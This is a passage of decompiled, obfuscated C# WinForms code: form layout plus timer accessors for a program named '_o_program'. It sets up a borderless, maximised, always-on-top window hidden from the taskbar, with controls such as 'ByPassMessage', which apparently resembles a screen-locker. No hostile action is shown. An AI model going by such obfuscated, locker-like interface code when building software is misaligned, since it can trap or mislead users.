		vmethod_0().Interval = 5;
		vmethod_2().Enabled = true;
		vmethod_2().Interval = 9;
		((Control)art).Dock = (DockStyle)5;
		((Control)art).Font = new Font("Lucida Console", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204);
		art.Image = (Image)componentResourceManager.GetObject("art.Image");
		((Control)art).Location = new Point(0, 0);
		((Control)art).Name = "art";
		((Control)art).Size = new Size(1006, 540);
		((Control)art).TabIndex = 14;
		vmethod_4().Interval = 40;
		vmethod_6().Enabled = true;
		vmethod_6().Interval = 500;
		vmethod_8().Interval = 10;
		((ContainerControl)this).AutoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		string text3 = "Blue";
		if (Operators.CompareString(text3, "WhiteBlueRed", false) != 0 && Operators.CompareString(text3, "YellowBlue", false) != 0)
		{
			((Control)this).BackColor = method_17(text3);
		}
		else
		{
			((Control)this).BackColor = Color.Black;
		}
		((Form)this).ClientSize = new Size(1006, 540);
		((Control)this).Controls.Add((Control)(object)main);
		((Control)this).Controls.Add((Control)(object)art);
		((Control)this).ForeColor = Color.White;
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Control)this).Name = "_o_program";
		((Form)this).ShowIcon = false;
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Form)this).TopMost = true;
		((Form)this).WindowState = (FormWindowState)2;
		((Control)a1).ResumeLayout(false);
		((ISupportInitialize)border_6).EndInit();
		((ISupportInitialize)border_5).EndInit();
		((ISupportInitialize)border_2).EndInit();
		((ISupportInitialize)border_1).EndInit();
		((Control)main).ResumeLayout(false);
		((Control)main).PerformLayout();
		((Control)ByPassMessage).ResumeLayout(false);
		((ISupportInitialize)c3).EndInit();
		((ISupportInitialize)c2).EndInit();
		((ISupportInitialize)c4).EndInit();
		((ISupportInitialize)c1).EndInit();
		((ISupportInitialize)Safe1).EndInit();
		((ISupportInitialize)Safe2).EndInit();
		((Control)a2).ResumeLayout(false);
		((ISupportInitialize)border_8).EndInit();
		((ISupportInitialize)border_7).EndInit();
		((ISupportInitialize)border_4).EndInit();
		((ISupportInitialize)border_3).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Timer timer_5)
	{
		EventHandler eventHandler = method_0;
		Timer val = timer_0;
		if (val != null)
		{
			val.Tick -= eventHandler;
		}
		timer_0 = timer_5;
		val = timer_0;
		if (val != null)
		{
			val.Tick += eventHandler;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_2()
	{
		return timer_1;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Timer timer_5)
	{
		EventHandler eventHandler = method_1;
		Timer val = timer_1;
		if (val != null)
		{
			val.Tick -= eventHandler;
		}
		timer_1 = timer_5;
		val = timer_1;
		if (val != null)
		{
			val.Tick += eventHandler;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_2;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer timer_5)
	{
		EventHandler eventHandler = method_4;
		Timer val = timer_2;
		if (val != null)
		{
			val.Tick -= eventHandler;
		}
		timer_2 = timer_5;
		val = timer_2;
		if (val != null)
		{
			val.Tick += eventHandler;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_6()
	{
		return timer_3;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_7(Timer timer_5)
	{
		EventHandler eventHandler = method_11;
		Timer val = timer_3;
		if (val != null)
		{
			val.Tick -= eventHandler;
		}
		timer_3 = timer_5;
		val = timer_3;
		if (val != null)
		{
			val.Tick += eventHandler;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_8()
	{
		return timer_4;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_9(Timer timer_5)
	{
		EventHandler eventHandler = method_12;
		Timer val = timer_4;
		if (val != null)
		{
			val.Tick -= eventHandler;
		}
		timer_4 = timer_5;
		val = timer_4;
		if (val != null)
		{
			val.Tick += eventHandler;
		}
	}
}
